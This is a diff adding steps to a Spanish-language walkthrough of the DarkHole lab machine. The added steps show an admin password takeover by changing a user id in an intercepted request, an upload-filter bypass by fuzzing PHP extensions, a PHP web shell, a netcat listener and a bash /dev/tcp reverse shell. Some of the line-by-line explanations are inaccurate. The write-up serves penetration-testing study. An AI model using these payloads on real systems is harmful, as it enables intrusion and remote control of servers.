@@ -80,7 +80,7 @@ Con este parámetro, se proporcionará más información sobre cada tecnología 
 
 ![imagen](/images/DarkHole/8.png)
 
-` Aplicamos un ataque con gobuster utilizando el diccionario big.txt a la ip de el servicio HTTP `
+`Aplicamos un ataque con gobuster utilizando el diccionario big.txt a la ip de el servicio HTTP`
 
 ![imagen](/images/DarkHole/9.png)
 
@@ -101,4 +101,157 @@ Con este parámetro, se proporcionará más información sobre cada tecnología 
 - http://192.1681.72/upload/d.jpg WTF
 ![imagen](/images/DarkHole/14.png)
 
+`Anteriormente se mencionó que es posible agregar un usuario y acceder al servidor web. El panel de control contiene la opción de actualizar la contraseña, la cual debemos interceptar con la herramienta BurpSuite.`
+
+![imagen](/images/DarkHole/15.png)
+
+<dt>Burpsuite</dt>
+<dd>Esta herramienta nos ayuda a el escaneo automatizado de vulnerabilidades,
+la manipulación y la repetición de solicitudes y respuestas HTTP/S, la prueba
+de inyección de código (como SQL injection y XSS), la interceptación 
+de solicitudes y respuestas para el análisis manual, y la creación de pruebas
+personalizadas.</dd>
+
+![imagen](/images/DarkHole/16.png)
+
+`El burpsuite nos arroja de manera muy directa el proseso que hace el servidor al actualizar una contraseña, de esto nos aprobecharemos suponiendo que "id=1 " pertenese al usuario admin si es que lo hubiera y cambiando su contraseña.`
+
+![imagen](/images/DarkHole/admin.png)
+
+`Sé consiguio el acceso como admin y ahora tenemos la posibilidad de subir un archivo. Presumiblemente, con ayuda de burpsuite interseptando la peticion podremos inyectar un comando .php ya que es evidente que esw una de las tecnologias utilizadas por este servidor, si esto tiene exito nos  mandarnos una shell a nuestra maquina`
+
+```js
+#<? php echo "<pre>" . shell_exec($_GET['cmd']) . "/pre"; ?>
+
+Este código es un ejemplo de código vulnerable en PHP. Este script 
+muestra el resultado de ejecutar un comando en el sistema operativo del  
+servidor que lo ejecuta. El comando a ejecutar se pasa como un parámetro 
+GET en la URL, lo que significa que un atacante podría proporcionar un 
+comando malicioso para ejecutar en el servidor.
+```
+![imagen](/images/DarkHole/19.png)
+
+`Subiremos el archivo .php para tratar de obtener una SHELL`
+
+![imagen](/images/DarkHole/20.png)
+![imagen](/images/DarkHole/21.png)
+
+`La pagina tiene alguna proteccion y nos dice que no estan admitidos algunos formatos y otros si, al igualq ue con el cambio de contraseña. Podremos interseptar esta peticion con burpsuite.`
+
+![imagen](/images/DarkHole/22.png)
+
+`De igual forma burpsuite nos arroja informacion muy valiosa en este caso la forma en la que se intenta subir el archivo.`
+
+- con Ctrl+i nos mandamos esta peticion al intruder y aplicamos un clear.
+
+![imagen](/images/DarkHole/23.png)
+
+- Fuseamos por la terminacion php.
+
+![imagen](/images/DarkHole/24.png)
+
+- y añadimos "php,php5,php3,php4,pht,phtm y phar" al payload 
+
+![imagen](/images/DarkHole/25.png)
+![imagen](/images/DarkHole/26.png)
+
+`Subiendo casi la mayoria de nuestras opciones.`
+
+![imagen](/images/DarkHole/27.png)
+
+`Haciendo una peticion simple al codigo que acabamos de inyecctar, quin nos debuelve una respuesta positiva es el archibo .phar`
+- 192.161.1.82/upload/bla.phar?cmd=whoami
+
+![imagen](/images/DarkHole/28.png)
+
+`Por otro lado nos pondremos en escuccha por el puerto 443 con netcat.`
+
+<dt>Netcat</dt>
+<dd>se puede utilizar para verificar la seguridad de una red, identificar
+puertos abiertos, probar la conectividad de red y verificar la 
+disponibilidad de servicios de red. También se puede utilizar 
+para transferir archivos entre sistemas y realizar tareas de 
+mantenimiento y resolución de problemas de red.</dd>
+
+```js
+#sudo nc -lvp 443
+Inicia un servidor de escucha en el puerto 443 utilizando Netcat.
+
+"-l" indica que Netcat se pondrá en modo de escucha.
+
+"-v" habilita la salida detallada de la información, lo que permite ver lo que está sucediendo en tiempo real.
+
+"-p" se utiliza para especificar el puerto en el que se escucharán las conexiones entrantes.
+```
+
+![imagen](/images/DarkHole/29.png)
+
+`Hacemos nuestro primer intento de obtener una shell.`
+
+```js
+#http://192.168.1.82/upload/bla.phar?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.1.77/443 0>%261"
+
+Este comando se utiliza para ejecutar un shell interactivo en la máquina
+objetivo y establecer una conexión inversa con un atacante.
+
+"http://192.168.1.82/upload/bla.phar" es la URL del archivo que se va a descargar desde el servidor.
+   
+"?cmd=" es un parámetro que se agrega al final de la URL que se utiliza para pasar comandos al archivo descargado.
+   
+"bash -c" es el comando que se va a pasar al archivo descargado, que indica que se va a ejecutar el siguiente comando en un subproceso de shell.
+    
+"bash -i" es el comando que se va a ejecutar en el subproceso de shell, lo que indica que se debe iniciar una sesión de shell interactiva.
+   
+">%26" se utiliza para redirigir la salida de error a la misma ubicación que la salida estándar. Esto permite que la conexión inversa se establezca correctamente.
+   
+"/dev/tcp/192.168.1.77/443" es la dirección IP y el puerto de destino para la conexión inversa. Esto indica que se va a conectar a un servidor en la dirección IP 192.168.1.77 en el puerto 443.
+   
+"0>%261" se utiliza para redirigir la entrada estándar a la misma ubicación que la salida estándar. Esto también permite que la conexión inversa se establezca correctamente.
+```
+
+![imagen](/images/DarkHole/30.png)
+
+`Con esta peticion logramos una shell a nuestra maquina.`
+- y con los iguientes comandos una shell totalmente funcional.
+
+```js
+#script /dev/null -c bash
+se utiliza para iniciar una sesión de shell interactiva en modo de
+registro sin guardar la salida en un archivo
+   
+"script" es un comando que se utiliza para registrar una sesión de shell en un archivo.
+    
+"/dev/null" es un dispositivo especial en el sistema de archivos de Unix que se utiliza para descartar la salida.
+    
+"-c bash" se utiliza para indicar que se debe ejecutar el comando "bash" en el registro.
+```
+- Ctrl+z 
+
+```js
+#stty raw -echo; fg
+
+Este comando se puede utilizar para ocultar la entrada de teclado del 
+usuario mientras se ejecuta un trabajo en segundo plano. Esto puede ser
+útil en situaciones en las que el trabajo en segundo plano se está ejecutando
+por un tiempo prolongado y se desea ocultar los detalles de la entrada del usuario.
+
+"stty raw -echo" establece la terminal en modo "raw", lo que significa que los caracteres ingresados por el usuario se transmiten directamente a la terminal sin procesamiento previo. Además, el comando "-echo" se utiliza para desactivar la retroalimentación de teclado en la pantalla, lo que oculta los caracteres ingresados por el usuario.
+
+"fg" se utiliza para continuar la ejecución de un trabajo suspendido en segundo plano en el primer plano.
+```
+
+```js
+#reset xterm
+
+Este comando, el emulador de terminal Xterm se restablece a sus valores predeterminados
+
+"reset" es un comando de Unix/Linux que se utiliza para restablecer la
+        terminal a su estado predeterminado, lo que significa que todas las 
+        configuraciones de terminal y los caracteres en la pantalla se 
+        borran y se restablecen a los valores predeterminados.
+
+"xterm" es un emulador de terminal de Unix/Linux que se utiliza para proporcionar 
+        una interfaz de usuario en modo texto a través de una conexión 
+        de red o en una sesión de terminal local.
+```
 
